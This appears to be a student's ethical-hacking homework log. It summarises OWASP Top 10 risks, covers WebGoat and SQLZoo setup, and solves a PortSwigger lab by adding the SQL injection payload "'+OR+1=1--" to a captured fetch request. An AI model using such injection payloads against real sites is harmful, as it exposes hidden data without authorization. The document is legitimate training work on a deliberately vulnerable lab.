## Read & Summarize
### OWASP: OWASP 10 2021
[A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- Number one security risk in 2021 according to OWASP
- Systems are failing to properly enforce restrictions on what authenticated users can do
- Unauthorized access to data for threat actors
- Bypassing access control checks
- Manipulating parameters to escalate privileges
- Prevention; better session management, server-side checks instead of reliance on client-side controls

[A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- Misconfiguration, for example: Default config's left unchanged, unnecessary features, verbose or too descriptive error messages giving crucial information to threat actors, outdated software
- These misconfigurations can allow unauthorized access to system data, or enable attacks such as SQL Injection
- Mitigation: Secure app architecture, regular updating and patching of systems, removing or disabling unnecessary features, proper security settings applied across **ALL** environments

[A06:2021 - Vulnerable and Outdated Components](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)
- Software components eg. libraries, frameworks or other software modules that aren't up to date or have known security flaws
- These components are usually embedded within the app or part of the underlying os or platform
- "Components typically run with the same privileges as the application itself, so flaws in any component can result in serious impact."
- These lead to data breaches or system compromise
- Mitigation: Inventory of all components, their versions, dependencies, and ensuring effective update and patching schedule to stay up to date

Here is an article that I recently read that came to mind when reading on Vulnerable and Outdated Components: [How to make any AMD Zen CPU always generate 4 as a random number](https://www.theregister.com/2025/02/04/google_amd_microcode/)

[A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- Untrusted data sent to interpreter as part of a command or query, this can lead to attackers executing unintended commands or accessing data without proper authorization
- Threat actors exploit vulnerabilities in user input validation, filtration, or sanitization, allowing them to inject malicious code
- Mitigation: Parameterized queries, input validation, employing libraries or frameworks that automatically get rid of special characters, and last but **definitely NOT least**, least privilege principles!

[Munroe: xkcd 327: Exploits of a Mom](https://xkcd.com/327/)

Silly cartoon regarding SQL Injections, made me realize the true implications of sanitization, that for example anybody can just use these on a text field on some survey etc. on the web, and be very successful since SQL is still one of the most widely used query languages to this day.

### [Install WebGoat 2023.4](https://terokarvinen.com/2023/webgoat-2023-4-ethical-web-hacking/)
No issues here what so ever, using Karvinen's tutorial was very straightforward, did get some errors though but they were just syntax errors eg. having a space in the wrong place (human incompetence).

### Solve Webgoat 2023.4: General: Developer tools
No issues here either, was easy to solve using the instructions

### Not outdated. Update all operating system and all applications in your Linux
I just closed the running WebGoat and used `sudo apt update` and `sudo apt upgrade` after which I used `sudo reboot`

### Sequel. Solve [SQLZoo](https://sqlzoo.net/wiki/SQL_Tutorial):
I had to update the clock again after rebooting using `sudo date -s "YYYY-MM-DD HH:MM:SS"`, the first one to solve was 0 SELECT basics, with 3 puzzles, very simple. The second one was also quite easy just changed the `WHERE population = 64105700` to `WHERE population > 200000000` or alternatively using `2e8` instead of writing out 200000000.

### Solve Portswigger Labs: [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
I did this assignment on my main os, not on the VM. I didn't want to install Burp Suite, so I used the developer tools to go into the network tab, from where I found the document with Query String Parameters `category=Accessories`, I right clicked the document and copied as Fetch (Node.js), after which I pasted it into the dev tools console, giving me `fetch("https://0a4a00650396f98f82cfe23200d400a7.web-security-academy.net/filter?category=Accessories", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "en-GB,en;q=0.6",
    "priority": "u=0, i",
    "sec-ch-ua": "\"Not(A:Brand\";v=\"99\", \"Brave\";v=\"133\", \"Chromium\";v=\"133\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "sec-gpc": "1",
    "upgrade-insecure-requests": "1",
    "cookie": "session=811ZqDQgAtLPlOsxSQ0qUP6Xiuk7RWO8",
    "Referer": "https://0a4a00650396f98f82cfe23200d400a7.web-security-academy.net/filter?category=Accessories",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": null,
  "method": "GET"
});`

on which i modified the first row to `fetch("https://0a4a00650396f98f82cfe23200d400a7.web-security-academy.net/filter?category=Accessories'+OR+1=1--"` and pressed enter.

Now the website tells me that the lab is completed, however can not see any hidden products pop up on the front end. Upon further inspection a fetch file can now be found under the network tab, after clicking it, the payload tab says `category=Accessories%27+OR+1=1--` and on the preview tab you can see the hidden products. I have previous experience using JavaScript and Node.js so this was a great learning curve for me!
